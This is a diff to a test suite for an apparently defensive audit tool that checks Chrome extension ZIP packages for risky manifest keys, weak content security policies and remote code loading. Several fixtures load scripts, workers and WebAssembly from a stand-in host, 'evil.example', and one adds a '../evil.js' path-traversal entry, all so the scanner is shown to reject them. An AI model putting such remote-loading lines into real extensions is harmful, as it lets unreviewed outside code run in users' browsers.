@@ -69,9 +69,16 @@ function baseManifest() {
     version: '0.1.0',
     default_locale: 'en',
     icons: { 16: 'icon/16.png' },
+    ...(expected.minimum_chrome_version
+      ? { minimum_chrome_version: expected.minimum_chrome_version }
+      : {}),
+    ...(expected.commands ? { commands: structuredClone(expected.commands) } : {}),
     permissions: [...expected.permissions],
     host_permissions: [...expected.host_permissions],
     optional_host_permissions: [...expected.optional_host_permissions],
+    ...(expected.content_security_policy
+      ? { content_security_policy: { ...expected.content_security_policy } }
+      : {}),
     action: { default_popup: 'popup.html' },
     background: { service_worker: 'background.js' },
   };
@@ -94,6 +101,13 @@ const withManifest = (mutate) => {
   mutate(manifest);
   return baseFiles(manifest);
 };
+
+const WAR_OK = {
+  resources: ['pdfjs/viewer.js'],
+  matches: ['https://example.com/*'],
+  use_dynamic_url: true,
+};
+const WAR_NO_DYNAMIC = { resources: ['pdfjs/viewer.js'], matches: ['https://example.com/*'] };
 
 const zipCases = [
   ['clean package passes', baseFiles(), 0, 'AUDIT PASSED'],
@@ -167,6 +181,24 @@ const zipCases = [
     'unexpected "history"',
   ],
   [
+    'CSP missing (differs from approved)',
+    withManifest((m) => delete m.content_security_policy),
+    1,
+    'content_security_policy',
+  ],
+  [
+    'wasm CSP plus unsafe-inline',
+    withManifest(
+      (m) =>
+        (m.content_security_policy = {
+          extension_pages:
+            "script-src 'self' 'wasm-unsafe-eval' 'unsafe-inline'; object-src 'self'",
+        }),
+    ),
+    1,
+    'content_security_policy',
+  ],
+  [
     'unsafe-eval CSP',
     withManifest(
       (m) => (m.content_security_policy = { extension_pages: "script-src 'self' 'unsafe-eval'" }),
@@ -185,6 +217,202 @@ const zipCases = [
     'not in the ZIP',
   ],
   ['path traversal entry', { ...baseFiles(), '../evil.js': 'x' }, 1, 'unsafe path'],
+
+  // Manifest key allowlist and risky keys.
+  [
+    'unexpected top-level manifest key',
+    withManifest((m) => (m.homepage_url = 'https://example.com')),
+    1,
+    'unexpected manifest key "homepage_url"',
+  ],
+  [
+    'web_accessible_resources without expectation',
+    withManifest(
+      (m) =>
+        (m.web_accessible_resources = [
+          { resources: ['a.js'], matches: ['<all_urls>'], use_dynamic_url: true },
+        ]),
+    ),
+    1,
+    'risky manifest key "web_accessible_resources"',
+  ],
+  ...[
+    ['externally_connectable', { matches: ['https://*.example.com/*'] }],
+    ['sandbox', { pages: ['s.html'] }],
+    ['oauth2', { client_id: 'x', scopes: ['email'] }],
+    ['key', 'TEST_PLACEHOLDER_NOT_A_KEY'],
+    ['update_url', 'https://example.com/update.xml'],
+    ['chrome_url_overrides', { newtab: 'popup.html' }],
+  ].map(([key, value]) => [
+    `risky manifest key ${key}`,
+    withManifest((m) => (m[key] = value)),
+    1,
+    `risky manifest key "${key}"`,
+  ]),
+  ['commands removed', withManifest((m) => delete m.commands), 1, '"commands" is missing'],
+  [
+    'commands changed',
+    withManifest((m) => (m.commands['explain-selection'].suggested_key.default = 'Ctrl+Shift+X')),
+    1,
+    '"commands" differs',
+  ],
+  [
+    'extra command',
+    withManifest((m) => (m.commands['run-everywhere'] = { description: 'x' })),
+    1,
+    '"commands" differs',
+  ],
+  [
+    'minimum_chrome_version removed',
+    withManifest((m) => delete m.minimum_chrome_version),
+    1,
+    '"minimum_chrome_version" is missing',
+  ],
+  [
+    'minimum_chrome_version changed',
+    withManifest((m) => (m.minimum_chrome_version = '100')),
+    1,
+    '"minimum_chrome_version" differs',
+  ],
+  [
+    'web_accessible_resources matching expectation with use_dynamic_url passes',
+    withManifest((m) => (m.web_accessible_resources = [WAR_OK])),
+    0,
+    'AUDIT PASSED',
+    { allowlist: { ...expected, web_accessible_resources: [WAR_OK] } },
+  ],
+  [
+    'web_accessible_resources expected but use_dynamic_url missing',
+    withManifest((m) => (m.web_accessible_resources = [WAR_NO_DYNAMIC])),
+    1,
+    'use_dynamic_url: true',
+    { allowlist: { ...expected, web_accessible_resources: [WAR_NO_DYNAMIC] } },
+  ],
+  [
+    'web_accessible_resources differs from expectation',
+    withManifest((m) => (m.web_accessible_resources = [{ ...WAR_OK, matches: ['<all_urls>'] }])),
+    1,
+    '"web_accessible_resources" differs',
+    { allowlist: { ...expected, web_accessible_resources: [WAR_OK] } },
+  ],
+  [
+    'extra key passes when added to allowedManifestKeys',
+    withManifest((m) => (m.homepage_url = 'https://example.com')),
+    0,
+    'AUDIT PASSED',
+    {
+      allowlist: {
+        ...expected,
+        allowedManifestKeys: [...expected.allowedManifestKeys, 'homepage_url'],
+      },
+    },
+  ],
+
+  // PDF.js scripting sandbox must never ship.
+  [
+    'quickjs wasm shipped',
+    { ...baseFiles(), 'pdfjs/wasm/quickjs-eval.wasm': Buffer.from([0, 97, 115, 109]) },
+    1,
+    'PDF.js scripting sandbox',
+  ],
+  [
+    'pdf.sandbox.js shipped',
+    { ...baseFiles(), 'chunks/pdf.sandbox.js': 'var x=1;' },
+    1,
+    'PDF.js scripting sandbox',
+  ],
+  [
+    'legitimate pdfjs assets pass in strict mode',
+    {
+      ...baseFiles(),
+      'pdfjs/wasm/openjpeg.wasm': Buffer.from([0, 97, 115, 109]),
+      'pdfjs/wasm/LICENSE_OPENJPEG': 'license',
+      'pdfjs/cmaps/Adobe-Japan1-0.bcmap': randomBytes(32),
+      'pdfjs/standard_fonts/FoxitDingbats.pfb': randomBytes(32),
+      'pdfjs/iccs/CGATS001Compat-v2-micro.icc': randomBytes(32),
+    },
+    0,
+    'AUDIT PASSED',
+    { args: ['--strict'] },
+  ],
+
+  // Remote-code patterns: negatives (must fail) and positives (local equivalents must pass).
+  ...[
+    ['protocol-relative import()', 'import("//evil.example/x.js");', 'remote dynamic import'],
+    [
+      'protocol-relative import() with template',
+      'import(`//evil.example/x.js`);',
+      'remote dynamic import',
+    ],
+    [
+      'protocol-relative static import',
+      'import x from"//evil.example/x.js";',
+      'remote static import',
+    ],
+    [
+      'instantiateStreaming(fetch(https))',
+      'WebAssembly.instantiateStreaming(fetch("https://evil.example/a.wasm"),{});',
+      'WebAssembly streaming compile',
+    ],
+    [
+      'compileStreaming(fetch(protocol-relative))',
+      'WebAssembly.compileStreaming(fetch("//evil.example/a.wasm"));',
+      'WebAssembly streaming compile',
+    ],
+    [
+      'instantiateStreaming(await fetch(http))',
+      'WebAssembly.instantiateStreaming(await fetch( "http://evil.example/a.wasm" ),{});',
+      'WebAssembly streaming compile',
+    ],
+    [
+      'fetch of remote .wasm',
+      'fetch("https://evil.example/a.wasm").then(r=>r.arrayBuffer());',
+      'remote .wasm',
+    ],
+    ['importScripts(https)', 'importScripts("https://evil.example/x.js");', 'importScripts()'],
+    [
+      'importScripts(protocol-relative)',
+      'importScripts("a.js","//evil.example/x.js");',
+      'importScripts()',
+    ],
+    ['Worker from protocol-relative URL', 'new Worker("//evil.example/w.js");', 'Worker created'],
+    ['script.src protocol-relative', 's.src="//evil.example/x.js";', 'script element'],
+  ].map(([name, code, text]) => [
+    `remote code: ${name}`,
+    { ...baseFiles(), 'background.js': code },
+    1,
+    text,
+  ]),
+  ...[
+    ['local import()', 'import("./chunk.js");'],
+    [
+      'local instantiateStreaming',
+      'WebAssembly.instantiateStreaming(fetch("/pdfjs/wasm/a.wasm"),{});',
+    ],
+    ['local importScripts', 'importScripts("chunks/a.js");'],
+    ['fetch of the Groq API', 'fetch("https://api.groq.com/openai/v1/models");'],
+    ['division operator that looks like //', 'var a=4//2\n;'],
+  ].map(([name, code]) => [
+    `remote code: ${name} passes`,
+    { ...baseFiles(), 'background.js': code },
+    0,
+    'AUDIT PASSED',
+  ]),
+
+  // Unknown file types warn normally and fail under --strict.
+  [
+    'unknown file type only warns by default',
+    { ...baseFiles(), 'data.xyz': 'abc' },
+    0,
+    'unrecognised file type',
+  ],
+  [
+    'unknown file type fails under --strict',
+    { ...baseFiles(), 'data.xyz': 'abc' },
+    1,
+    'unrecognised file type',
+    { args: ['--strict'] },
+  ],
 ];
 
 const results = [];
@@ -199,10 +427,16 @@ function runNode(script, args) {
   });
 }
 
-zipCases.forEach(([name, files, wantCode, wantText], index) => {
+zipCases.forEach(([name, files, wantCode, wantText, options = {}], index) => {
   const file = path.join(scratch, `case-${index}.zip`);
   writeFileSync(file, writeZip(files));
-  const run = runNode('audit-zip.mjs', ['--zip', file]);
+  const args = ['--zip', file, ...(options.args ?? [])];
+  if (options.allowlist) {
+    const allowlistFile = path.join(scratch, `allowlist-${index}.json`);
+    writeFileSync(allowlistFile, JSON.stringify(options.allowlist));
+    args.push('--allowlist', allowlistFile);
+  }
+  const run = runNode('audit-zip.mjs', args);
   const output = `${run.stdout}${run.stderr}`;
   const leaked = output.includes(fakeKey);
   const ok = run.status === wantCode && output.includes(wantText) && !leaked;
